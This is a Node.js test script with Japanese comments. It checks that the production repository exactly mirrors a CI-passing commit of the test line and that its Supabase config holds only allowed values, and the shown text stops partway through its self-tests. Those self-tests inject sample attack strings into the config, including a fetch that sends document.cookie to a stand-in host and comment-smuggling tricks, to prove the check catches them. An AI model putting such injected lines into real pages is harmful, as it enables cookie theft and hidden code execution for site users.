/* mirror-match.test.mjs — ★本番の中身は「テスト線で押されて CI が緑だった 1つの commit」と同じか★（Timeally）
 * =============================================================================
 * ★なぜ 要るか（2026-10-20 司さん「テストと本番のコードが変わらん仕組みならやれ」）★
 *   写す道具（scripts/mirror-to-prod.mjs）は ★写した直後に 揃える★だけ。
 *   本番に 直に commit されても・テスト線だけ 進んでも ★どこも 赤に ならなかった★
 *   （09-02 から 10-20 まで 本番は テスト線より 17 commit・48日 遅れていた＝前科「staging だけ直して 本番が6日 そのまま」と 同じ形）。
 *
 * ★写した印★ mirror-from.txt（★本番 repo の 根にだけ 在る★・中身＝テスト線の commit SHA 40字 1行）
 *   写す道具が 書く。テスト線には 無い（在れば 赤＝本番の 印が 紛れた）。
 *
 * ★本番で 見る事（3か所で 同じ物を 走らせる）★
 *   ① 本番の CI（push の度）  ② ★Vercel の build（--vercel）＝赤なら 配らない★  ③ 手元の run.js
 *   ・印の SHA が ★テスト線 main の 祖先★か（PR の頭・force-push で 消えた 物を 指して 緑に しない）
 *   ・その SHA の テスト線の CI（ci.yml・push）が ★success★ か
 *   ・本番の 作業木と その SHA の 木が 同じか。違って よいのは 3つだけ:
 *       mirror-from.txt … 本番にだけ 在る
 *       js/supa-config.js … ★値（url・key・env）だけ★ 違って よい。形は 同じ（1行 足しても 赤）。★値も ここで 縛る★（cfgSei＝url は https://<20字>.supabase.co ちょうど・その 線の ref・key の 形・env）＝Vercel の build でも 走る
 *       *.html … ★?v= の 刻印だけ★（材料に supa-config が 入るので 必ず 違う）。式は stamp-build の restamp と 同じ物
 *
 * ★テスト線から 外を 見る（--watch-prod・.github/workflows/mirror-watch.yml が push と 毎日 走らせる）★
 *   本番 main を 取って 上と 同じ 比べ ＋ ★遅れ★：写していない テスト線の commit の 一番 古い 物が
 *   OKURE_HI 日 以上 前なら 赤。＝本番で .github ごと 見張りを 外されても ★外から★ 捕まる。
 *   取れない・読めない は 赤（★未測定を 緑に しない★）。
 *   ★mirror-watch.yml は 本番に 印が 入った 後に 別の commit で 置く★（先に 置くと 印が 無くて 赤が 住む）。
 *   置くまでの 間は「外から 見る」は 0回＝下の ③ は 効いていない。
 *
 * ★守らない物（書いておく）★
 *   ・遅れ OKURE_HI 日 未満の 違いは 赤に しない（＝「変わらない」は「7日 以内に 揃う」の 意味）。
 *   ・Vercel の 画面での 巻き戻し・昇格（build しない）と `vercel deploy --prebuilt` は ② を 通らない。
 *   ・本番を CLI（vercel deploy）で 配ると：配る commit（VERCEL_GIT_COMMIT_SHA）が 付かなければ 赤。
 *     付いた 時、送った 物は ★印（mirror-from.txt）の テスト線の commit★と 比べる（vercel.json だけは 配る commit の
 *     中身と JSON として 全く 同じ 時だけ 通す）。＝配る SHA を 新しく 名乗り 中身は 前に 写した 古い 印の 物、は 緑
 *     （テスト線で CI が 緑だった 中身＝巻き戻しと 同じ 重さ）。
 *     CLI で SHA が 付くかは 未測定＝合図が 死んだ 日は まず Vercel の 画面で git の 配りを やり直す。
 *   ・Vercel から GitHub の 読み口は 鍵なし（1時間 60回・IP ごと）。当たると 配りが 止まる 側（残り回数を 出す）。
 *   ・公開 repo の 毎日の 回は 60日 動きが 無いと GitHub が 止める。
 *   ・本番 main への 直の push その物は 止めない（GitHub の 枝の 守りは 掛けていない）。
 *     止めるのは ②（Vercel が 配らない）。② が 効くのは vercel.json の buildCommand が 残っている間だけ
 *     ＝本番で vercel.json ごと 消されたら ③ の 外の 見張りが 次の 日までに 赤に する。
 *   ・倉庫（Supabase の 関数・表）は 見ない。repo の 中身だけ。
 *   ・本番の CI と Vercel は ★押した後に★ 走る。
 *
 * 使い方: node tests/mirror-match.test.mjs              … この repo の 素性に 合う 見張り
 *         node tests/mirror-match.test.mjs --vercel     … Vercel の build（git が 無い・素性は VERCEL_GIT_REPO_SLUG）
 *         node tests/mirror-match.test.mjs --watch-prod … テスト線から 本番を 見る（遅れも）
 *         node tests/mirror-match.test.mjs --self-test
 */
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import crypto from 'node:crypto';
import https from 'node:https';
import { execFileSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { restamp } from '../scripts/stamp-build.mjs';
/* 倉庫の ref を 持って よいのは supa-config-matches-repo だけ（no-hardcoded-supa の 決まり）＝借りる。読み込んだ だけでは 走らない */
import { REFS, keyRefOf } from './supa-config-matches-repo.test.mjs';

const ROOT = path.join(path.dirname(fileURLToPath(import.meta.url)), '..');

/* ★比べる 相手は 白名簿で 固定★（origin の 名前から 作らない＝改名・移管で 黙って 相手が 変わらない） */
export const SEN = {
  test: { name: 'timeally-test', slug: 'exally-zeroact/timeally-test', url: 'https://github.com/exally-zeroact/timeally-test.git' },
  prod: { name: 'timeally', slug: 'exally-zeroact/timeally', url: 'https://github.com/exally-zeroact/timeally.git' },
};
export const SIRUSHI = 'mirror-from.txt';
const CFG = 'js/supa-config.js';
export const OKURE_HI = 7;
const SKIP_DIR = new Set(['.git', 'node_modules', '.vercel']);
const skipFile = (name) => /\.log$/.test(name);   /* 写す道具と 同じ（手元の 記録は repo の 中身でない） */
const BINARY = /\.(png|pdf)$/i;                    /* .gitattributes と 同じ */

/* ══════════ 木を 読む ══════════ */
/** git の blob id（中身から 作る）。文字は ★CRLF→LF★（eol=lf で 押される 形）＝Windows の 手元でも 押す物と 同じ id */
export function blobId(rel, buf) {
  const data = BINARY.test(rel) ? buf : Buffer.from(buf.toString('utf8').replace(/\r\n/g, '\n'), 'utf8');
  return crypto.createHash('sha1').update('blob ' + data.length + '\0').update(data).digest('hex');
}
/** 作業木（★押す物★＝commit 前でも 写した 直後でも 同じ 物を 見る）。mode は git が 在れば 索引から */
export function readWorkTree(root) {
  const out = new Map();
  const walk = (rel) => {
    for (const f of fs.readdirSync(path.join(root, rel || '.'))) {
      if (SKIP_DIR.has(f) || skipFile(f)) continue;
      const r = rel ? path.posix.join(rel, f) : f;
      const st = fs.statSync(path.join(root, r));
      if (st.isDirectory()) { walk(r); continue; }
      const buf = fs.readFileSync(path.join(root, r));
      out.set(r, { id: blobId(r, buf), text: () => buf.toString('utf8') });
    }
  };
  walk('');
  if (fs.existsSync(path.join(root, '.git'))) {
    for (const line of git(root, ['ls-files', '-s']).split('\n')) {
      const m = /^(\d{6}) [0-9a-f]{40} \d\t(.+)$/.exec(line);
      if (m && out.has(m[2])) out.get(m[2]).mode = m[1];
      /* ★飛ばす 場所（.vercel・node_modules 等）でも git に 入っている 物は 数える★
         （本番 main に .vercel/output を 無理に 入れられると 名前で 飛ばして 緑に なった＝taiketsu 10-20） */
      else if (m && !out.has(m[2]) && m[2].split('/').some((x) => SKIP_DIR.has(x)) && fs.existsSync(path.join(root, m[2]))) {
        const buf = fs.readFileSync(path.join(root, m[2]));
        out.set(m[2], { id: blobId(m[2], buf), mode: m[1], text: () => buf.toString('utf8') });
      }
    }
  }
  return out;
}
/** git の 木（ls-tree -r）。中身は 要る時だけ cat-file */
export function readGitTree(dir, rev) {
  const out = new Map();
  for (const line of git(dir, ['ls-tree', '-r', '--full-tree', rev]).split('\n')) {
    const m = /^(\d{6}) (\w+) ([0-9a-f]{40})\t(.+)$/.exec(line);
    if (!m) continue;
    if (m[2] !== 'blob') { out.set(m[4], { id: m[3], mode: m[1], text: () => '' }); continue; }
    const id = m[3];
    out.set(m[4], { id, mode: m[1], text: () => git(dir, ['cat-file', 'blob', id]) });
  }
  return out;
}
function git(dir, args) {
  return execFileSync('git', ['-C', dir, ...args], { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'], maxBuffer: 64 << 20 });
}

/* ══════════ 比べる（★純関数★＝作り物の 木でも 本物の 木でも 同じ 物差し） ══════════ */
/** 設定の 形＝★JS の 字句を 1字ずつ 読み★、コメントを 落とし、`url|key|env : '文字列'` の 値だけを Q に した 字句の 並び。
 *  読めない（閉じない 文字列・閉じない コメント・文字列の 中の 改行）は null＝赤。
 *  ★正規表現で 削る 作りを やめた 訳（10-20 taiketsu 2回）★
 *    ・コメントを 先に 落とす → 値の 中の「/*」から 後ろの コードが 消えた
 *    ・値を 先に Q に する   → コメントの 中の 偽の「url: '*／ fetch(..); /*'」が コードを 飲み込んだ
 *    ＝文字列と コメントは ★同じ 1回の 読みで★ 分けないと どちらかの 向きで 必ず 抜ける。
 *  ★テスト線の 並びと 1字句でも 違えば 赤★＝正規表現・テンプレート・<!-- 等は 「/」「`」「<」の 字句が 増えて 赤に なる。 */
export function jsTokens(src) {
  const s = String(src), out = [];
  const EOL = (c) => c === '\n' || c === '\r' || c === ' ' || c === ' ';   /* JS の 行の 終わり（// を 閉じる） */
  let i = 0;
  while (i < s.length) {
    const c = s[i];
    if (/\s/.test(c)) { i++; continue; }
    if (c === '/' && s[i + 1] === '/') { i += 2; while (i < s.length && !EOL(s[i])) i++; continue; }
    if (c === '/' && s[i + 1] === '*') { const e = s.indexOf('*/', i + 2); if (e < 0) return null; i = e + 2; continue; }
    if (c === "'" || c === '"') {
      let j = i + 1, v = '';
      for (;;) {
        if (j >= s.length || s[j] === '\n' || s[j] === '\r') return null;   /* 閉じない・逃がしの 無い 改行（JS でも 構文の 誤り） */
        if (s[j] === '\\') { if (j + 1 >= s.length) return null; v += s[j] + s[j + 1]; j += 2; continue; }
        if (s[j] === c) break;
        v += s[j]; j++;
      }
      out.push(c + v + c); i = j + 1; continue;
    }
    const m = /^[A-Za-z0-9_$]+/.exec(s.slice(i, i + 200));
    if (m) { out.push(m[0]); i += m[0].length; continue; }
    out.push(c); i++;
  }
  return out;
}
export function cfgShape(src) {
  const out = jsTokens(src);
  if (!out) return null;
  for (let k = 0; k + 2 < out.length; k++) {
    if (/^(url|key|env)$/.test(out[k]) && out[k + 1] === ':' && /^'/.test(out[k + 2])) out[k + 2] = 'Q';
  }
  return out.join(' ');
}

/** ★設定の 値 その物を 縛る★（10-20 taiketsu 3回目＝形は 同じでも 値に 偽の URL を 入れると 両方の 見張りが 緑だった）
 *  字句で 取り出した 値を 頭から 終わりまで 縛り、その 線の ref と 突き合わせる。★Vercel の build でも 走る 所で 使う★。
 *  ・url … https://<20字>.supabase.co ちょうど（? @ .別の名前 http: 末尾の 字 は 全部 赤）
 *  ・key … sb_publishable_… か JWT（中の ref も その 線の 物）。逃がし（\）は 1つも 許さない（壊れた 逃がしで 画面が 全部 止まる）
 *  ・env … その 線の 名札 ／ 3つとも ちょうど 1回 */
export function cfgSei(src, gawa) {
  const t = jsTokens(src);
  if (!t) return { ok: false, why: '設定を 字句として 読めない' };
  /* ★字句の 並び 全体を 白名簿で 固定★（10-20 taiketsu 4回目＝「url: を 探す」だと 後ろの
     window.SUPA.url = … ／ 'url': … ／ ['url']: … ／ Object.assign(…) の 上書きが 通った）。
     ちょうど `window . SUPA = { url : V , key : V , env : V [,] } ;` だけ。1字句でも 多い・違えば 赤 */
  const KATA = ['window', '.', 'SUPA', '=', '{', 'url', ':', 0, ',', 'key', ':', 0, ',', 'env', ':', 0];
  const ato = t.slice(KATA.length);
  if (t.length < KATA.length || KATA.some((x, k) => x !== 0 && t[k] !== x)
    || !(ato.join(' ') === '} ;' || ato.join(' ') === ', } ;')) {
    return { ok: false, why: '設定の 字句の 並びが 決まった 形（window.SUPA = { url, key, env };）で ない' };
  }
  const v = { url: t[7], key: t[11], env: t[15] };
  const why = [];
  for (const n of ['url', 'key', 'env']) {
    if (!(n in v)) { why.push(n + ' が 無い'); continue; }
    if (!/^'[^'\\]*'$/.test(v[n])) why.push(n + ' の 値が 「\'…\'」で ない か 逃がし（\\）を 含む');
    v[n] = v[n].slice(1, -1);
  }
  if (why.length) return { ok: false, why: why.join('・') };
  const m = /^https:\/\/([a-z0-9]{20})\.supabase\.co$/.exec(v.url);
  if (!m) why.push('url が https://<20字>.supabase.co ちょうどで ない');
  else if (m[1] !== REFS[gawa]) why.push('url の 倉庫が この線（' + gawa + '）の 物で ない');
  if (!/^(sb_publishable_[A-Za-z0-9_-]+|eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)$/.test(v.key)) why.push('key の 形が 違う');
  else if (/^eyJ/.test(v.key) && keyRefOf("key: '" + v.key + "'") !== REFS[gawa]) why.push('key の 中の 倉庫が この線の 物で ない');
  if (v.env !== gawa) why.push('env が ' + gawa + ' で ない');
  return { ok: !why.length, why: why.join('・') || '値は この線の 物' };
}
const htmlShape = (src) => restamp(String(src).replace(/\r\n/g, '\n'), '00000000');

/** ★Vercel の build の 場★：作業木の vercel.json が 配る commit の git の 中身と ★JSON として 全く 同じ 時だけ★ git の 中身に 置き換える。
 *  10-20 テスト線の 配りで 実測＝Vercel は build の 前に vercel.json を 書き直す（536字→442字・変わった 鍵 0＝字の 並びだけ）。
 *  鍵・値が 1つでも 違えば 置き換えない＝比べで 赤（CLI で 手元の 書きかけを 送っても 通らない＝taiketsu 10-20）。
 *  何が 変わったかは 鍵ごとに 出す（数で 残す）。git に vercel.json が 無ければ 置き換えない（比べで 赤） */
/** git の 木で、作業木の 歩きが 飛ばす 場所（.vercel・node_modules・.git）に 在る 物＝Vercel の 場（.git 無し）では 見えないので 名前で 赤に する */
export const kakureMichi = (ki) => [...ki.keys()].filter((p) => p.split('/').some((x) => SKIP_DIR.has(x)));
export function jsonKata(x) {
  if (Array.isArray(x)) return '[' + x.map(jsonKata).join(',') + ']';
  if (x && typeof x === 'object') return '{' + Object.keys(x).sort().map((k) => JSON.stringify(k) + ':' + jsonKata(x[k])).join(',') + '}';
  return JSON.stringify(x);
}
export function vercelJsonGitDe(work, gitKi) {
  const w = work.get('vercel.json'), g = gitKi.get('vercel.json');
  if (!g || !w || w.id === g.id) return work;
  let a, b;
  try { a = JSON.parse(w.text()); b = JSON.parse(g.text()); } catch (e) {
    console.log('  ✗ Vercel の build の vercel.json が JSON として 読めない＝置き換えない');
    return work;
  }
  const obj = (x) => x && typeof x === 'object' && !Array.isArray(x);
  if (!obj(a) || !obj(b)) { console.log('  ✗ Vercel の build の vercel.json が { … } で ない＝置き換えない'); return work; }
  const k = [...new Set([...Object.keys(a || {}), ...Object.keys(b || {})])];
  const chigau = k.filter((x) => jsonKata(a[x]) !== jsonKata(b[x]))
    .map((x) => x + (Object.prototype.hasOwnProperty.call(b, x) ? (Object.prototype.hasOwnProperty.call(a, x) ? '(値)' : '(消えた)') : '(足された)'));
  const onaji = jsonKata(a) === jsonKata(b);
  console.log('  （Vercel の build の vercel.json … 作業木 ' + w.text().length + '字 ／ git ' + g.text().length + '字 ／ 変わった 鍵: '
    + (chigau.join(', ') || '無し') + (onaji ? '＝字の 並びだけ＝git の 中身で 比べる' : '＝★中身が 違う＝置き換えない（赤）★') + '）');
  if (!onaji) return work;
  const m = new Map(work);
  m.set('vercel.json', { ...g });
  return m;
}

/** honban（本番の 木）と tesuto（その SHA の テスト線の 木）を 比べる。aka＝赤の 理由 */
export function compare(honban, tesuto) {
  const aka = [], kazu = { onaji: 0, kokuin: 0, cfg: 0, mode: 0 };
  for (const p of honban.keys()) if (p !== SIRUSHI && !tesuto.has(p)) aka.push('本番にだけ 在る: ' + p);
  for (const p of tesuto.keys()) if (!honban.has(p)) aka.push('本番に 足りない: ' + p);
  if (tesuto.has(SIRUSHI)) aka.push('テスト線の 木に ' + SIRUSHI + ' が 在る（本番の 印が 紛れた）');
  for (const [p, h] of honban) {
    const t = tesuto.get(p);
    if (!t || p === SIRUSHI) continue;
    if (h.mode && t.mode) { kazu.mode++; if (h.mode !== t.mode) aka.push('mode が 違う: ' + p + ' 本番 ' + h.mode + ' ／ テスト線 ' + t.mode); }
    if (h.id === t.id) { kazu.onaji++; continue; }
    if (p === CFG) {
      const ka = cfgShape(h.text()), kb = cfgShape(t.text());
      if (ka !== null && ka === kb) { kazu.cfg++; continue; }
      aka.push('★設定の 形が 違う★（値 以外が 変わった）: ' + p);
    } else if (/\.html$/i.test(p)) {
      if (htmlShape(h.text()) === htmlShape(t.text())) { kazu.kokuin++; continue; }
      aka.push('★画面が ?v= の 刻印 以外で 違う★: ' + p);
    } else aka.push('★中身が 違う★: ' + p);
  }
  return { aka, kazu };
}

/** 印の 形 */
export const sirushiOk = (s) => /^[0-9a-f]{40}$/.test(String(s).trim());
/** 素性（白名簿）。読めない・知らない 名前は null＝赤 */
export function sokusei(name) {
  if (name === SEN.test.name) return 'test';
  if (name === SEN.prod.name) return 'prod';
  return null;
}
/** Vercel の build での 素性。git から 配った 時は VERCEL_GIT_REPO_SLUG（持ち主も 見る）、
 *  CLI で 配った 時（GitHub の 合図が 死んだ 時の 道）は 本番の 名前の URL を 白名簿で 引く。どちらも 無ければ ''＝赤 */
export function vercelName(env) {
  if (env.VERCEL_GIT_REPO_SLUG) return env.VERCEL_GIT_REPO_OWNER === 'exally-zeroact' ? env.VERCEL_GIT_REPO_SLUG : '';
  const host = { 'timeally-test.vercel.app': SEN.test.name, 'timeally.vercel.app': SEN.prod.name };
  return host[env.VERCEL_PROJECT_PRODUCTION_URL] || '';
}
/** テスト線の CI（ci.yml・push）の 一番 新しい 回が success か */
export function ciMidori(runs) {
  const ci = (runs || []).filter((r) => r.path === '.github/workflows/ci.yml' && r.event === 'push')
    .sort((a, b) => String(b.created_at).localeCompare(String(a.created_at)));
  if (!ci.length) return { ok: false, why: 'その SHA の テスト線の CI が 1回も 無い' };
  const r = ci[0];
  if (r.status !== 'completed') return { ok: false, why: 'その SHA の テスト線の CI が まだ 終わっていない（' + r.status + '）' };
  if (r.conclusion !== 'success') return { ok: false, why: 'その SHA の テスト線の CI が ' + r.conclusion };
  return { ok: true, why: 'テスト線の CI 緑（run ' + r.id + '）' };
}
/** 遅れ＝写していない テスト線の commit の 一番 古い 物の 日数（無ければ 0） */
export function okure(furuiCt, nowMs) {
  if (furuiCt == null) return 0;
  return (nowMs - furuiCt * 1000) / 86400000;
}

/* ══════════ 外と 話す 所 ══════════ */
const tmps = [];
process.on('exit', () => { for (const d of tmps) try { fs.rmSync(d, { recursive: true, force: true }); } catch (e) { /* 片付けの 失敗で 判じを 変えない */ } });
function tmpGit() {
  const d = fs.mkdtempSync(path.join(os.tmpdir(), 'mirror-match-'));
  tmps.push(d);
  git(d, ['init', '-q']);
  return d;
}
/** 公開 repo の main を 取る。★checkout の 鍵（extraheader）を 外す★＝別の repo を 読む時に 邪魔しない */
/* ★中身（blob）は 取らない★＝木と 履歴だけ（手元の 網で 丸ごとは 150秒で 切れ、blob 無しは 2秒・10-20 実測）。
   中身は cat-file の 時に 要る 物だけ 取りに 行く（remote を 名指しして 置く＝promisor） */
function fetchMain(d, url) {
  git(d, ['remote', 'add', 'm', url]);
  /* 送りの 途中で 切れる 事が ある（手元で 10-20 に 3回）＝1回だけ 取り直す。2回とも だめなら 投げる（呼ぶ側が 赤に する） */
  for (let i = 1; ; i++) {
    try {
      execFileSync('git', ['-C', d, '-c', 'http.https://github.com/.extraheader=', 'fetch', '-q', '--no-tags', '--filter=blob:none', 'm', 'main'],
        { stdio: ['ignore', 'pipe', 'pipe'], timeout: 60000 });
      break;
    } catch (e) {
      if (i >= 2) throw e;
      console.log('  （' + url.split('/').pop() + ' を 取る 1回目が 落ちた＝もう1回: ' + String(e.message).split('\n')[0] + '）');
    }
  }
  return git(d, ['rev-parse', 'FETCH_HEAD']).trim();
}
async function ciOf(sha) {
  const yomu = (tok) => {
    const h = { Accept: 'application/vnd.github+json', 'User-Agent': 'timeally-mirror-match' };
    if (tok) h.Authorization = 'Bearer ' + tok;
    /* fetch でなく 素の https（agent 無し）＝Windows で fetch の 後に exit すると libuv が 落ちて 終わり値 127 に 化けた（10-20 実測） */
    return new Promise((ok, ng) => {
      const q = https.get('https://api.github.com/repos/' + SEN.test.slug + '/actions/runs?per_page=50&head_sha=' + sha,
        { headers: h, agent: false, timeout: 30000 }, (res) => {
          let b = ''; res.setEncoding('utf8'); res.on('data', (c) => { b += c; });
          res.on('end', () => ok({ status: res.statusCode, ok: res.statusCode >= 200 && res.statusCode < 300, json: async () => JSON.parse(b),
            nokori: res.headers['x-ratelimit-remaining'] }));
        });
      q.on('timeout', () => q.destroy(new Error('30秒で 返事が 無い')));
      q.on('error', ng);
    });
  };
  const tok = process.env.GITHUB_TOKEN || process.env.GH_TOKEN;
  let r, kagi = tok ? '鍵あり' : '鍵なし';
  try {
    r = await yomu(tok);
    /* 鍵が 別の repo で 弾かれたら 鍵なしで もう1回（公開 repo は 鍵なしで 読める）。それでも だめなら 赤 */
    if (tok && (r.status === 401 || r.status === 403)) { r = await yomu(''); kagi = '鍵が 弾かれ 鍵なし'; }
  } catch (e) { return { ok: false, yometa: false, why: 'GitHub に 届かない（' + e.message + '）＝未測定＝赤' }; }
  /* 回数の 上限（鍵なしは 1時間 60回・IP ごと）に 当たったのか 見分けが 付く 様に 残りの 数も 出す */
  if (!r.ok) return { ok: false, yometa: false, why: 'GitHub の 返事が ' + r.status + '（' + kagi + '・残り回数 ' + (r.nokori ?? '不明')
    + (r.nokori === '0' ? '＝★回数の 上限に 当たった★' : '') + '）＝読めない＝未測定＝赤' };
  return { ...ciMidori((await r.json()).workflow_runs), yometa: true, kagi };
}
/** ★本番で 初めて 走る 道を テスト線で 先に 試す★＝親の commit の CI を 読めるか（緑かは 問わない・読めないなら 赤） */
async function ciTameshi(d, sha) {
  let oya = '';
  try { oya = git(d, ['rev-parse', sha + '^']).trim(); } catch (e) { return ['★親の commit が 無い★（' + sha.slice(0, 12) + '）＝GitHub の 読み口を 試せない']; }
  const c = await ciOf(oya);
  console.log('  ' + (c.yometa ? '✓' : '✗') + ' GitHub の 読み口（' + (c.kagi || '?') + '）… 親 ' + oya.slice(0, 12) + ' の CI を 読めた か: ' + c.why);
  return c.yometa ? [] : ['★GitHub の 読み口が 使えない★ ' + c.why + '＝本番の 門が 動かない'];
}

/** 本番の 木（honban）と 印を 受けて 全部 判じる。出しは 字で、赤なら 理由を 返す */
async function hanjiru(honban, sirushi, label) {
  const aka = [];
  console.log('  写した印 ' + SIRUSHI + ' … ' + (sirushi == null ? '（無い）' : sirushi.trim()));
  if (sirushi == null) return ['★' + SIRUSHI + ' が 無い★＝どの テスト線の commit を 写したか 分からない（写す道具を 通していない）'];
  if (!sirushiOk(sirushi)) return ['★' + SIRUSHI + ' の 形が 違う★（40字の 16進 1行で ない）'];
  const sha = sirushi.trim();
  const d = tmpGit();
  {
    let head;
    try { head = fetchMain(d, SEN.test.url); } catch (e) { return ['★テスト線を 取れない★（' + String(e.message).split('\n')[0] + '）＝未測定＝赤']; }
    console.log('  テスト線 main の 頭 … ' + head.slice(0, 12));
    try { git(d, ['merge-base', '--is-ancestor', sha, head]); } catch (e) {
      return ['★印の SHA が テスト線 main に 無い★（PR の 頭・消された 枝・別の repo の 物を 指している）: ' + sha.slice(0, 12)];
    }
    const ci = await ciOf(sha);
    console.log('  ' + (ci.ok ? '✓ ' : '✗ ') + ci.why);
    if (!ci.ok) aka.push('★' + ci.why + '★');
    const tesuto = readGitTree(d, sha);
    const r = compare(honban, tesuto);
    console.log('  比べた（' + label + '）… 本番 ' + honban.size + '本 ／ テスト線 ' + tesuto.size + '本 ／ 中身が 同じ ' + r.kazu.onaji
      + ' ／ 刻印だけ 違う 画面 ' + r.kazu.kokuin + ' ／ 値だけ 違う 設定 ' + r.kazu.cfg + ' ／ mode を 比べた ' + r.kazu.mode);
    aka.push(...r.aka);
    const sei = cfgSei(honban.has(CFG) ? honban.get(CFG).text() : '', 'prod');
    console.log('  ' + (sei.ok ? '✓' : '✗') + ' 本番の 設定の 値 … ' + sei.why);
    if (!sei.ok) aka.push('★本番の 設定の 値が おかしい★ ' + sei.why);
    const ato = git(d, ['rev-list', '--reverse', sha + '..' + head]).split('\n').filter(Boolean);
    return { aka, d, sha, head, ato };
  }
}

/* ══════════ 自己確認（★本物の 木で わざと 壊す★） ══════════ */
if (process.argv.includes('--self-test')) {
  console.log('\n[mirror-match --self-test] ★今の repo の 木を わざと 壊して 赤に なるか★');
  let ng = 0;
  const iu = (nm, good) => { if (!good) ng++; console.log('  ' + (good ? '✓' : '✗') + ' ' + nm + (good ? '' : '  ★思っていたのと 違う★')); };
  const moto = readWorkTree(ROOT);
  moto.delete(SIRUSHI);
  const kopi = () => new Map([...moto].map(([k, v]) => [k, { ...v }]));
  const kae = (m, p, f) => { const v = m.get(p); const t = f(v.text()); m.set(p, { ...v, id: blobId(p, Buffer.from(t)), text: () => t }); return m; };
  const html = [...moto.keys()].find((p) => /\.html$/.test(p));
  const js = [...moto.keys()].find((p) => /^js\/.*\.js$/.test(p) && p !== CFG);
  iu('材料が 在る（設定・画面・js が 木に 在る）＝無ければ この 自己確認は 空振り', moto.has(CFG) && !!html && !!js);
  const midori = (h) => compare(h, moto).aka.length === 0;
  const aka = (h) => compare(h, moto).aka.length > 0;
  iu('同じ 木 ＋ 印 … 緑', midori(kopi().set(SIRUSHI, { id: 'x', text: () => '' })));
  iu('本番に 余り 1本 … 赤', aka(kopi().set('js/kossori.js', { id: 'y', text: () => 'x' })));
  iu('本番に 足りない 1本 … 赤', aka((() => { const m = kopi(); m.delete(js); return m; })()));
  iu('js が 1字 違う … 赤', aka(kae(kopi(), js, (s) => s + ' ')));
  iu('★画面の ?v= の 刻印だけ 違う … 緑★', midori(kae(kopi(), html, (s) => s.replace(/\?v=[0-9a-f]{7,8}/g, '?v=deadbeef'))));
  iu('画面が 刻印 以外で 1字 違う … 赤', aka(kae(kopi(), html, (s) => s.replace('</body>', '<b>x</b></body>'))));
  {
    const cdn = (v) => (s) => s.replace('</head>', '<script src="https://x.example/a.js?v=' + v + '"></script></head>');
    iu('外の CDN の ?v= は 刻印 扱いに しない（両方に 在って 版だけ 違う）… 赤', compare(kae(kopi(), html, cdn('1111111')), kae(kopi(), html, cdn('2222222'))).aka.length > 0);
  }
  iu('★設定の 値（url・key・env）だけ 違う … 緑★（値が 3つとも 本当に 変わった 上で）', ((m) => m.get(CFG).id !== moto.get(CFG).id
    && [/^\s*url: 'https:\/\/x\.example'/m, /^\s*key: 'kagi'/m, /^\s*env: 'prod'/m].every((x) => x.test(m.get(CFG).text())) && midori(m))(kae(kopi(), CFG, (s) => s.replace(/^(\s*)url:\s*'[^']*'/m, "$1url: 'https://x.example'").replace(/^(\s*)key:\s*'[^']*'/m, "$1key: 'kagi'").replace(/^(\s*)env:\s*'[^']*'/m, "$1env: 'prod'"))));
  iu('★設定に 1行 足す … 赤★', aka(kae(kopi(), CFG, (s) => s + "\nfetch('https://x.example/');\n")));
  iu('★設定の 値の 中に「/*」・後ろに コード・別の 文字列に「*/」… 赤★（10-20 taiketsu が 抜けた 形）',
    aka(kae(kopi(), CFG, (s) => s.replace(/^(\s*)url:\s*'([^']*)'/m, "$1url: '$2/*', steal: fetch('https://x.example/' + document.cookie), z: '*/'"))));
  {
    const tail = (x) => (s) => s.replace(/\s*$/, '\n' + x + '\n');
    iu('★コメントの 中の 偽の url の 値で 後ろの コードを 飲ませる 形 … 赤★（10-20 taiketsu 2回目）',
      aka(kae(kopi(), CFG, tail("/* url: '*/ fetch('https://x.example/?' + document.cookie); /*' */"))));
    iu('// の 説明文の 後ろに U+2028（JS では 行の 終わり）＋ コード … 赤', aka(kae(kopi(), CFG, tail('// x fetch(1);'))));
    iu('テンプレート文字列・<!-- … 赤', aka(kae(kopi(), CFG, tail('`${fetch(1)}`;'))) && aka(kae(kopi(), CFG, tail('<!-- x\nfetch(1);'))));
    iu('閉じない コメント・閉じない 文字列 … 読めない＝赤（両方 読めない でも 緑に しない）',
      aka(kae(kopi(), CFG, tail('/* x'))) && aka(kae(kopi(), CFG, tail("'x"))) && cfgShape("'x") === null);
    iu('値の 中の 逃がした 引用符（\\\'）は 1つの 値＝緑', midori(kae(kopi(), CFG, (s) => s.replace(/^(\s*)key:\s*'[^']*'/m, "$1key: 'a\\'b'"))));
  }
  {
    /* ★値 その物の 縛り（cfgSei）★＝10-20 taiketsu 3回目の 5形 ＋ 足した 物。ref は 借りた REFS から 組む（ここに 字で 書かない） */
    const SB = '.' + 'supabase' + '.co';
    /* ★作り物の テスト線の 設定を 元に 組む★（本物の 設定を 元に すると 本番では 元から 赤で「壊したら 赤」が 空振りし、
       「テスト線の 物で 緑」は 本番で 必ず ✗ に なった＝taiketsu 10-20 本番前）。説明文の env:'prod' も 置く（行の 頭で 縛る 試し） */
    const cfg = "/* 作り物 … 本番は env:'prod' */\nwindow.SUPA = {\n  url: 'https://" + REFS.test + SB + "',\n  key: 'sb_publishable_tsukurimono',\n  env: 'test'\n};\n";
    const urlWo = (u) => cfg.replace(/^(\s*)url:\s*'[^']*'/m, "$1url: '" + u + "'");
    iu('作り物の テスト線の 設定 … テスト線では 緑 ／ 本番と 言うと 赤', cfgSei(cfg, 'test').ok && !cfgSei(cfg, 'prod').ok);
    {
      /* ★この repo の 本物の 設定は この repo の 線（origin の 名前）で 緑・反対の 線で 赤★ */
      const g = sokusei(originName(ROOT)), real = moto.get(CFG).text();
      iu('この repo の 本物の 設定 … 自分の 線（' + g + '）で 緑・反対の 線で 赤', !!g && cfgSei(real, g).ok && !cfgSei(real, g === 'test' ? 'prod' : 'test').ok);
    }
    for (const [nm, u] of [
      ['? の 後ろに 本物の 倉庫', 'https://x.example/x?https://' + REFS.test + SB],
      ['本物の 倉庫の 名前の 後ろに 別の 名前', 'https://' + REFS.test + SB + '.x.example'],
      ['@ の 後ろが 別の 名前', 'https://' + REFS.test + SB + '@x.example'],
      ['http（s 無し）', 'http://' + REFS.test + SB],
      ['もう片方の 線の 倉庫', 'https://' + REFS.prod + SB],
    ]) iu('url ' + nm + ' … 赤', !cfgSei(urlWo(u), 'test').ok);
